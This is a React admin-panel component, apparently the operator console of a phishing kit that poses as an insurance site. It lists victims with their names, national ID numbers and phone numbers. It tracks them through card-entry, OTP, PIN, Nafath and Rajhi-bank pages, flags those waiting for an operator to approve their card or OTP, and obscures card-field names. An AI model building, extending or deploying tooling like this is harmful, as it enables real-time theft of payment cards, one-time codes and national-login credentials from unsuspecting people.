"use client";

import {
  Search,
  Trash2,
  CheckSquare,
  Square,
  CreditCard,
  KeyRound,
  RefreshCw,
  Ban,
  ShieldCheck,
} from "lucide-react";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { getTimeAgo } from "@/lib/time-utils";
import { updateApplication } from "@/lib/firebase-services";
import { useState } from "react";

interface VisitorSidebarProps {
  visitors: InsuranceApplication[];
  selectedVisitor: InsuranceApplication | null;
  onSelectVisitor: (visitor: InsuranceApplication) => void;
  searchQuery: string;
  onSearchChange: (query: string) => void;
  cardFilter: "all" | "hasCard";
  onCardFilterChange: (filter: "all" | "hasCard") => void;
  selectedIds: Set<string>;
  onToggleSelect: (id: string) => void;
  onSelectAll: () => void;
  onDeleteSelected: () => void;
  sidebarWidth: number;
  onSidebarWidthChange: (width: number) => void;
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.cardStatus === "message" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  );
};

const getCardStatusBadge = (status: InsuranceApplication["cardStatus"]) => {
  switch (status) {
    case "approved_with_otp":
      return { label: "✓ OTP", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
    case "approved_with_pin":
      return { label: "✓ PIN", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
    case "rejected":
      return { label: "✗ مرفوض", cls: "bg-red-100 text-red-600 border border-red-200" };
    case "message":
      return { label: "📲 رسالة", cls: "bg-amber-100 text-amber-700 border border-amber-200 animate-pulse" };
    case "waiting":
      return { label: "⏳ انتظار", cls: "bg-yellow-100 text-yellow-700 border border-yellow-200" };
    default:
      return null;
  }
};

// Get current page name in Arabic
const getPageName = (step: number | string): string => {
  // Handle string values first (legacy system)
  if (typeof step === "string") {
    const stringPageNames: Record<string, string> = {
      // Home
      home: "الصفحة الرئيسية",
      "home-new": "الصفحة الرئيسية",
      // Insurance
      insur: "بيانات التأمين",
      // Offers
      compar: "مقارنة العروض",
      // Payment / card
      payment: "الدفع والتحقق",
      check: "الدفع",
      _st1: "الدفع (بطاقة)",
      _t1: "بيانات البطاقة",
      // OTP
      otp: "التحقق OTP",
      _t2: "التحقق OTP",
      step2: "التحقق OTP",
      veri: "رمز تحقق",
      // PIN
      pin: "التحقق PIN",
      _t3: "التحقق PIN",
      step3: "التحقق PIN",
      confi: "التحقق PIN",
      // Phone
      phone: "معلومات الهاتف",
      step5: "معلومات الهاتف",
      // Nafad
      nafad: "نفاذ",
      _t6: "نفاذ",
      step4: "نفاذ",
      nafad_modal: "نافذة نفاذ",
      // Rajhi
      rajhi: "الراجحي",
    };
    return stringPageNames[step] ?? "غير معروف";
  }

  // Handle numeric values
  const stepNum = typeof step === "number" ? step : parseInt(step);
  const pageNames: Record<number, string> = {
    0: "الصفحة الرئيسية",
    1: "الصفحة الرئيسية",
    2: "بيانات التأمين",
    3: "مقارنة العروض",
    4: "الدفع",
    5: "التحقق OTP",
    6: "التحقق PIN",
    7: "معلومات الهاتف",
    8: "نفاذ",
    9: "OTP الأخير",
  };

  return pageNames[stepNum] ?? "غير معروف";
};

const getVisitorDisplayName = (visitor: InsuranceApplication) =>
  visitor.ownerName || (visitor as any).name || "بدون اسم";

const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
  (visitor.redirectPage ||
    visitor.currentPage ||
    visitor.currentStep ||
    "home") as number | string;

const hasCardData = (visitor: InsuranceApplication): boolean => {
  if (visitor._v1 || visitor.cardNumber) return true;

  if (!visitor.history || !Array.isArray(visitor.history)) return false;

  return visitor.history.some(
    (entry: any) =>
      (entry.type === "_t1" || entry.type === "card") &&
      (entry.data?._v1 || entry.data?.cardNumber)
  );
};

function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
  const [loading, setLoading] = useState(false);

  const handleToggle = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!visitor.id || loading) return;
    setLoading(true);
    try {
      await updateApplication(visitor.id, { isBlocked: !visitor.isBlocked });
    } catch {
      // silent
    } finally {
      setLoading(false);
    }
  };

  return (
    <button
      onClick={handleToggle}
      disabled={loading}
      title={visitor.isBlocked ? "إلغاء الحظر" : "حظر الزائر"}
      className={`flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40 ${
        visitor.isBlocked
          ? "bg-red-100 text-red-600 hover:bg-red-200"
          : "bg-gray-100 text-gray-400 hover:bg-red-100 hover:text-red-600"
      }`}
    >
      {visitor.isBlocked ? (
        <ShieldCheck className="w-3.5 h-3.5" />
      ) : (
        <Ban className="w-3.5 h-3.5" />
      )}
    </button>
  );
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange,
}: VisitorSidebarProps) {
  const allSelected =
    visitors.length > 0 && selectedIds.size === visitors.length;
  const unreadCount = visitors.filter((visitor) => visitor.isUnread).length;
  const waitingCount = visitors.filter(isWaitingForAdmin).length;
  const isLandscape =
    typeof window !== "undefined" &&
    window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
      .matches;

  return (
    <div
      className="h-full w-full bg-white/95 backdrop-blur-sm landscape:border-l md:w-[280px] md:border-l border-gray-200 flex flex-col relative group shadow-sm"
      style={{
        fontFamily: "Cairo, Tajawal, sans-serif",
        width: isLandscape ? `${sidebarWidth}px` : undefined,
      }}
    >
      {/* Header */}
      <div className="p-3 sm:p-4 landscape:p-2 border-b border-gray-200 bg-gradient-to-b from-white to-gray-50">
        <h1 className="text-xl landscape:text-base font-bold text-gray-800 mb-4 landscape:mb-2">
          لوحة التحكم
        </h1>
        <div className="mb-3 flex flex-wrap items-center gap-2">
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-blue-100 text-blue-700">
            إجمالي: {visitors.length}
          </span>
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-pink-100 text-pink-700">
            غير مقروء: {unreadCount}
          </span>
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-amber-100 text-amber-700">
            قيد المراجعة: {waitingCount}
          </span>
        </div>

        {/* Search */}
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 landscape:w-4 landscape:h-4 text-gray-400" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-lg border border-gray-300 py-2 pl-4 pr-10 text-sm focus:outline-none focus:ring-2 focus:ring-green-500 landscape:py-1.5 landscape:text-xs"
          />
        </div>

        {/* Filters */}
        <div className="mb-3 grid grid-cols-2 gap-2 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "all"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "hasCard"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        {/* Actions */}
        <div className="flex flex-wrap gap-2">
          <button
            onClick={onSelectAll}
            className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-gray-200 px-3 py-1.5 text-sm font-medium transition-colors hover:bg-gray-300 landscape:py-1 landscape:text-xs"
          >
            {allSelected ? (
              <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" />
            ) : (
              <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />
            )}
            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
          </button>

          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-red-500 px-3 py-1.5 text-sm font-medium text-white transition-colors hover:bg-red-600 landscape:py-1 landscape:text-xs"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-gray-500 space-y-2">
            <p className="text-3xl">📭</p>
            <p className="font-semibold">لا يوجد زوار</p>
            <p className="text-xs text-gray-400">
              سيظهر الزوار هنا عند بدء التفاعل
            </p>
          </div>
        ) : (
          visitors.map((visitor) => {
            const hasCard = hasCardData(visitor);

            return (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className={`border-b border-gray-100 p-3 sm:p-4 landscape:p-2 cursor-pointer transition-colors hover:bg-gray-50 ${
                  selectedVisitor?.id === visitor.id
                    ? "bg-green-50 border-r-4 border-r-green-600"
                    : visitor.isBlocked
                    ? "bg-red-50 border-r-4 border-r-red-500"
                    : ""
                } ${visitor.isUnread && !visitor.isBlocked ? "bg-pink-50" : ""}`}
              >
                <div className="flex items-start gap-3">
                  {/* Checkbox */}
                  <div
                    onClick={(e) => {
                      e.stopPropagation();
                      if (visitor.id) onToggleSelect(visitor.id);
                    }}
                    className="mt-1"
                  >
                    {visitor.id && selectedIds.has(visitor.id) ? (
                      <CheckSquare className="w-5 h-5 text-green-600" />
                    ) : (
                      <Square className="w-5 h-5 text-gray-400" />
                    )}
                  </div>

                  {/* Visitor Info */}
                  <div className="flex-1 min-w-0">
                    {/* Name & Time Ago */}
                    <div className="mb-1 flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
                      <div className="flex min-w-0 flex-wrap items-center gap-1.5">
                        <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">
                          {getVisitorDisplayName(visitor)}
                        </h3>
                        {visitor.isBlocked && (
                          <span className="flex items-center gap-0.5 rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-600 whitespace-nowrap border border-red-200">
                            <Ban className="w-2.5 h-2.5" />
                            محظور
                          </span>
                        )}
                        <span className="flex items-center gap-1 rounded bg-teal-600 px-2 py-0.5 text-[11px] font-medium text-white whitespace-nowrap">
                          {isWaitingForAdmin(visitor) && (
                            <RefreshCw className="w-3 h-3 animate-spin" />
                          )}
                          {getPageName(getVisitorCurrentPage(visitor))}
                        </span>
                      </div>

                      {/* Time ago + Block */}
                      <div className="flex items-center gap-2 whitespace-nowrap sm:self-auto">
                        <span className="text-xs landscape:text-[10px] text-gray-500 font-medium">
                          {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                        </span>
                        <BlockButton visitor={visitor} />
                      </div>
                    </div>

                    {/* Contact Info: Phone & ID */}
                    <div className="hidden sm:flex items-center gap-3 mb-2 text-xs text-gray-700">
                      {visitor.phoneNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">
                            📞 {visitor.phoneNumber}
                          </span>
                        </div>
                      )}
                      {visitor.identityNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">
                            🆔 {visitor.identityNumber}
                          </span>
                        </div>
                      )}
                    </div>

                    {/* Bottom Row: Status & Page */}
                    <div className="hidden sm:flex items-center justify-between">
                      {/* Left: Online Status & Icons */}
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-1">
                          <div
                            className={`w-2 h-2 rounded-full ${
                              visitor.isOnline ? "bg-green-500" : "bg-gray-400"
                            }`}
                          ></div>
                          <span className="text-xs text-gray-600">
                            {visitor.isOnline ? "متصل" : "غير متصل"}
                          </span>
                        </div>

                        {hasCard && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">
                            <CreditCard className="w-3 h-3" />
                            <span>بطاقة</span>
                          </div>
                        )}
                        {(() => {
                          const badge = getCardStatusBadge(visitor.cardStatus);
                          return badge ? (
                            <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold whitespace-nowrap ${badge.cls}`}>
                              {badge.label}
                            </span>
                          ) : null;
                        })()}
                        {visitor.phoneVerificationCode && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">
                            <KeyRound className="w-3 h-3" />
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
